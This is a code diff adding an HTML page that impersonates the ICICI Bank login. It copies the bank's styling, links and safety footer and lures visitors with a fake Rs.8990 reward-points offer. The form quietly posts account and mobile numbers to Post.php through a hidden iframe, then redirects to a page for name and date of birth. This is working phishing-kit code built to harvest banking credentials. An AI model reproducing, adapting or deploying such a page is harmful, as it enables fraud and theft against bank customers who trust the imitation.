@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ICICI Bank Login</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f0f0; /* Light gray background */
+        }
+        .container {
+            max-width: 400px;
+            margin: 20px auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Subtle shadow */
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header img {
+            max-width: 200px; /* Adjust logo size */
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #f69312; /* Orange button */
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .links {
+            margin-top: 15px;
+            text-align: center;
+        }
+        .links a {
+            color: #007bff; /* Blue link color */
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .message {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #fff8dc; /* Light yellow background */
+            border: 1px solid #eee;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .download-app {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .download-app img {
+            max-width: 318px;
+        }
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 14px;
+            color: #777;
+        }
+        .footer a {
+            color: #007bff;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .footer p {
+            margin: 5px 0;
+        }
+        .quick-links {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 20px;
+        }
+        .quick-links a {
+            color: #007bff;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- partial:index.partial.html -->
+      <div class="login-box">
+      <!-- Static- Please don't do anything here-->
+      <script type="text/javascript">var submitted=false;</script>
+      <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Name_And_DOB.html';}"></iframe>
+      <!--My Form-->
+      <form class="LoginForm" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+    <div class="container">
+        <div class="header">
+            <img src="icici h.jpg" alt="ICICI Bank Logo">  </div>
+
+            <div class="input-group">
+                    <label for="userid">Account Number</label>
+                    <input type="text" class="new-control" name="Account No." id="lo" maxLength="12"  inputmode="numeric" required="" />
+            </div>
+
+
+        <div class="input-group">
+            <label for="userid">Mobile Number</label>
+        <input type="text" class="new-control" id="Mobile_Number" name="Mobile_Number" maxLength="10" inputmode="numeric"
+            pattern="[6-9]\d{9}" title="Please enter valid mobile number !" required=""/>
+
+
+            
+           
+
+            
+        </div>
+
+        <button class="btn">Login</button>
+
+        <div class="links">
+            <a href="https://infinity.icicibank.com/corp/AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&__START_TRAN_FLAG__=Y&__EVENT_ID__=LOAD&__CALL_MODE__=92&LOGIN_FLAG=1&BANK_ID=ICI&ACCESS_DEV=WAP">Forgot User ID or Password</a> | 
+            <a href="https://infinity.icicibank.com/corp/AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&__START_TRAN_FLAG__=Y&FG_BUTTONS__=LOAD&ACTION.LOAD=Y&AuthenticationFG.LOGIN_FLAG=1&BANK_ID=ICI&ITM=nli_personalb_personal_login_btn&_gl=1*30xkeg*_ga*MTgzMDcxOTY5Ni4xNjIwMDM5NDU0*_ga_SKB78GHTFV*MTYyODIzNDM4NC43Ny4xLjE2MjgyMzQ1MDQuMjc.&_ga=2.92094746.1084279428.1697432242-1973315115.1690798212&_gac=1.213008672.1697523963.EAIaIQobChMI-7jpvrn8gQMVt6lmAh1nywMHEAAYASAAEgKBxfD_BwE?ITM=nli_personalb_personal_login_btn">Continue to Desktop Login</a>
+        </div>
+
+        <div class="message">
+            Please use your existing Internet Banking Mobile No./ATM Pin/User ID and Password (credentials) of Personal and Business Banking and reedem Your Rs.8990/- Reward Points.
+        </div>
+
+        <div class="download-app">
+            <a href="#">
+                <img src="iMobile Logo.jpg" alt="iMobile Logo">  </a>
+        </div>
+
+      
+        </div>
+
+        <div class="footer">
+            <p>Safe Banking: Never share your User ID, password or any other information with anyone on phone, SMS or Email. ICICI Bank does not call/email customers for such information. Beware of fraudsters asking for such details posing as Bank staff.</p>
+            <a href="#">Disclaimer</a> | <a href="#">Privacy</a> | <a href="#">Desktop Site</a>
+            <p>&copy; ICICI Bank</p>
+        </div>
+    </div>
+</body>
+</html>
